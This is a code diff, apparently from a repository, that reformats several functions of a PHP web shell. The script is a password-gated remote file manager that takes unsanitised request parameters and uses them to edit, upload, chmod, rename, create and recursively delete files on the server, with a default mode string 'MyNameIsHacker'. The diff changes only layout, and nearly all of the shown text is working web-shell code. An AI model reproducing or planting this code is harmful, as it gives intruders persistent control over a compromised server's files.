@@ -348,8 +348,15 @@ function File_Edit($filepath,$filename,$dim = '')
 {
 	$THIS_DIR = urlencode($filepath);
 	$THIS_FILE = File_Str($filepath.'/'.$filename);
-	if(file_exists($THIS_FILE)){$FILE_TIME = @date('Y-m-d H:i:s',filemtime($THIS_FILE));$FILE_CODE = htmlspecialchars(File_Read($THIS_FILE));}
-	else {$FILE_TIME = @date('Y-m-d H:i:s',time());$FILE_CODE = '';}
+	if(file_exists($THIS_FILE))
+		{
+			$FILE_TIME = @date('Y-m-d H:i:s',filemtime($THIS_FILE));
+			$FILE_CODE = htmlspecialchars(File_Read($THIS_FILE));
+		}
+	else 
+		{
+			$FILE_TIME = @date('Y-m-d H:i:s',time());$FILE_CODE = '';
+		}
 print<<<END
 <script language="javascript">
 var NS4 = (document.layers);
@@ -452,9 +459,23 @@ function File_a($p)
 		$intime = @strtotime($_POST['mtime']);
 		$MSG_BOX = File_Write($_POST['pfn'],$_POST['pfc'],'wb') ? 'Edit file '.$_POST['pfn'].' success' : 'Edit file '.$_POST['pfn'].' failed';@touch($_POST['pfn'],$intime);
 	}
-	if(!empty($_FILES['ufp']['name'])){if($_POST['ufn'] != '') $upfilename = $_POST['ufn']; else $upfilename = $_FILES['ufp']['name'];$MSG_BOX = File_Up($_FILES['ufp']['tmp_name'],File_Str($REAL_DIR.'/'.$upfilename)) ? 'upload files '.$upfilename.' success' : 'upload files '.$upfilename.' failed';}
-	if(!empty($_POST['actall'])){$MSG_BOX = File_Act($_POST['files'],$_POST['actall'],$_POST['inver']);}
-	if(isset($_GET['md'])){$modfile = File_Str($REAL_DIR.'/'.$_GET['mk']); if(!eregi("^[0-7]{4}$",$_GET['md'])) $MSG_BOX = 'Attribute value error'; else $MSG_BOX = @chmod($modfile,base_convert($_GET['md'],8,10)) ? 'modify '.$modfile.' Attribute is '.$_GET['md'].' success' : 'modify '.$modfile.' Attribute is '.$_GET['md'].' failed';}
+	if(!empty($_FILES['ufp']['name'])){
+		if($_POST['ufn'] != '') 
+			$upfilename = $_POST['ufn']; 
+		else 
+			$upfilename = $_FILES['ufp']['name'];
+		$MSG_BOX = File_Up($_FILES['ufp']['tmp_name'],File_Str($REAL_DIR.'/'.$upfilename)) ? 'upload files '.$upfilename.' success' : 'upload files '.$upfilename.' failed';
+	}
+	if(!empty($_POST['actall'])){
+		$MSG_BOX = File_Act($_POST['files'],$_POST['actall'],$_POST['inver']);
+	}
+	if(isset($_GET['md'])){
+		$modfile = File_Str($REAL_DIR.'/'.$_GET['mk']); 
+		if(!eregi("^[0-7]{4}$",$_GET['md'])) 
+			$MSG_BOX = 'Attribute value error'; 
+		else 
+			$MSG_BOX = @chmod($modfile,base_convert($_GET['md'],8,10)) ? 'modify '.$modfile.' Attribute is '.$_GET['md'].' success' : 'modify '.$modfile.' Attribute is '.$_GET['md'].' failed';
+	}
 	if(isset($_GET['mn'])){$MSG_BOX = @rename(File_Str($REAL_DIR.'/'.$_GET['mn']),File_Str($REAL_DIR.'/'.$_GET['rn'])) ? 'Renamed '.$_GET['mn'].' for '.$_GET['rn'].' success' : 'Renamed '.$_GET['mn'].' for '.$_GET['rn'].' failed';}
 	if(isset($_GET['dn'])){$MSG_BOX = @mkdir(File_Str($REAL_DIR.'/'.$_GET['dn']),0777) ? 'Create a directory '.$_GET['dn'].' success' : 'Create a directory '.$_GET['dn'].' failed';}
 	if(isset($_GET['dd'])){$MSG_BOX = File_Deltree($_GET['dd']) ? 'Delete directory '.$_GET['dd'].' success' : 'Delete directory '.$_GET['dd'].' failed';}
@@ -521,7 +542,7 @@ print<<<END
 END;
 ?>
 	<div id="msgbox" class="msgbox">
-		<?= $MSG_BOX ?>			
+		<?= $MSG_BOX ?>		
 	</div>
 	<div class="actall">
 		<table class="table" width="100%;">
@@ -2164,7 +2185,15 @@ if($_COOKIE['admin_spiderpass'] != md5($password))
 	exit;
 }
 
-if(isset($_GET['s'])){$s = $_GET['s'];if($s != 'a' && $s != 'n')Root_CSS();}else{$s = 'MyNameIsHacker';}
+if(isset($_GET['s']))
+	{
+		$s = $_GET['s'];
+		if($s != 'a' && $s != 'n')
+			Root_CSS();
+	}
+	else{
+		$s = 'MyNameIsHacker';
+}
 $p = isset($_GET['p']) ? $_GET['p'] : File_Str(dirname(__FILE__));
 
 switch($s)
